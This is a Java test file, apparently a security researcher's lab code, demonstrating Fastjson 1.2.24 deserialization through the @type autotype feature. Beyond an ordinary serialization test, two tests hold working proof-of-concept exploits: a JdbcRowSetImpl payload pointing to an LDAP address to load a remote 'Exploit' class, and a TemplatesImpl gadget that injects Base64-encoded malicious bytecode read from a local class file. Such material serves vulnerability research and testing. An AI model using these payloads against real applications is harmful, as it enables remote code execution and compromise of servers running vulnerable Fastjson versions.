package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import me.mole.pojo.Student;
import org.apache.commons.io.IOUtils;
import org.apache.tomcat.util.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;

public class Fastjson1224ApplicationTest {

    @Test
    public void test1() {
        Student student = new Student();
        student.setName("lAdyb1rd");
        student.setAge(6);
        HashMap<String,String> map = new HashMap<String,String>();
        map.put("k1", "val1");
        student.setProperties(map);
//
        System.out.println("----------序列化------------");
        //SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，
        // 设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名
        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println(jsonstring);

        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
//        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"properties\":{\"@type\":\"java.util.HashMap\",\"k1\":\"val1\"}}";
        System.out.println("jsonStr=" + jsonStr);
//        System.out.println("----------反序列化: JSON.parseObject,带类型class------------");
        //Feature.SupportNonPublicField：当属性为私有，且没有对应的public setter方法时，可以反序列化私有属性。
//        Student stu1 = JSON.parseObject(jsonStr, Student.class, Feature.SupportNonPublicField);
//        Student stu1 = (Student) JSON.parseObject(jsonStr, Object.class, Feature.SupportNonPublicField);
//        System.out.println(stu1);
//        System.out.println("----------反序列化: JSON.parseObject，不带类型class------------");
//        JSONObject jsonObject = JSON.parseObject(jsonStr, Object.class, Feature.SupportNonPublicField);
//        System.out.println(jsonObject);
        System.out.println("----------反序列化: JSON.parse------------");
        Student stu2 = (Student) JSON.parse(jsonStr);
        System.out.println(stu2);
    }

    @Test
    public void test_poc_1() {
        String fj_poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    private String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    @Test
    public void test_poc_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/Exploit2.class";
        String evilCode = readClass(evilClassPath);
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
//        String NASTY_CLASS = "me.mole.pojo.Student";
        String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}\n";
        System.out.println(fj_poc);

        Object parse = JSON.parse(fj_poc, Feature.SupportNonPublicField);
        System.out.println(parse);
    }
}